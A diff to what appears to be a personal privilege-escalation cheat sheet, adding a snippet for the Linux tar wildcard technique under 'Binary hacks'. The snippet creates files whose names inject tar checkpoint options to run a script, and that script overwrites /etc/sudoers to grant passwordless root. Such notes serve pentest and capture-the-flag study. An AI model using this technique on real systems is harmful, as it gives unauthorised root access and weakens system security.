@@ -112,6 +112,17 @@
 
 ### Binary hacks
 1. wildcards with tar in bash script: https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa 
+-   ```
+        # 1. Create files in the current directory called
+        # '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh'
+
+        echo "" > '--checkpoint=1'
+        echo "" > '--checkpoint-action=exec=sh privesc.sh'
+
+        # 2. Create a privesc.sh bash script, that allows for privilege escalation
+        #malicous.sh:
+        echo '{current username} ALL=(root) NOPASSWD: ALL' > /etc/sudoers
+    ```
 
 ### Write to system files for misconfigure Bins
 - Example: dosbox w/ SUID
